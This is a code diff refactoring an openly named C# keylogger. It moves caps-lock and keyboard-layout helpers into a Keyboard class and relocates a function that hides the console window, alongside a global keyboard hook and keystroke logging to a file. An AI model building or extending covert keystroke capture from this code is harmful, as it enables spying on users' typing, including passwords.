@@ -38,7 +38,7 @@ public static class Program
         };
         
         // TODO check something weird going on
-        _capsLockActive = GetCapsLockState();
+        _capsLockActive = Keyboard.GetCapsLockState();
 
         // install a keyboard hook
         _kbHook = PInvoke.SetWindowsHookEx(
@@ -346,23 +346,8 @@ public static class Program
     }
 
     /// <summary>
-    ///     Gets current state of caps lock.
+    /// Writes an informational string to the log file if it's empty.
     /// </summary>
-    /// <returns><c>True</c> if locked, <c>false</c> otherwise</returns>
-    private static bool GetCapsLockState()
-    {
-        return PInvoke.GetAsyncKeyState(0x14) != 0;
-    }
-
-    /// <summary>
-    ///     Hides current console window.
-    /// </summary>
-    private static void HideWindow()
-    {
-        var hWnd = PInvoke.GetConsoleWindow();
-        PInvoke.ShowWindow(hWnd, SHOW_WINDOW_CMD.SW_HIDE);
-    }
-
     private static void WriteInfoToLogFile()
     {
         if (new FileInfo(PathToFile).Length != 0) return;
@@ -370,7 +355,7 @@ public static class Program
         Writer.Write($"https://github.com/schmaldeo/keylogger v{Assembly.GetEntryAssembly()!.GetName().Version} {DateTime.Now}\n\n" +
                           $"If you see something like: [CODE: xxxx], you can check what key the code represents on " +
                           $"https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\n\n" +
-                          $"Keyboard layout: {GetKeyboardLayout()}. Find more information about it on: " +
+                          $"Keyboard layout: {Keyboard.GetKeyboardLayout()}. Find more information about it on: " +
                           $"https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-LCID/%5bMS-LCID%5d.pdf\n" +
                           $"The modifier keys only modify the output to this file for the following characters: " +
                           $"; , . / ` [ ] \\ ', for the other ones like shift + numbers or alt graph + letters, you " +
@@ -381,16 +366,11 @@ public static class Program
     }
     
     /// <summary>
-    ///     Gets the keyboard layout returned by GetKeyboardLayout function from user32.dll.
+    ///     Hides current console window.
     /// </summary>
-    /// <returns>
-    ///     Hex string containing the language identifier. You can read more about it here: 
-    ///     https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-LCID/%5bMS-LCID%5d.pdf
-    /// </returns>
-    private static string GetKeyboardLayout()
+    private static void HideWindow()
     {
-        var layout = PInvoke.GetKeyboardLayout(0);
-        var lcid = layout >> 16;
-        return $"0x{lcid:X4}";
+        var hWnd = PInvoke.GetConsoleWindow();
+        PInvoke.ShowWindow(hWnd, SHOW_WINDOW_CMD.SW_HIDE);
     }
 }
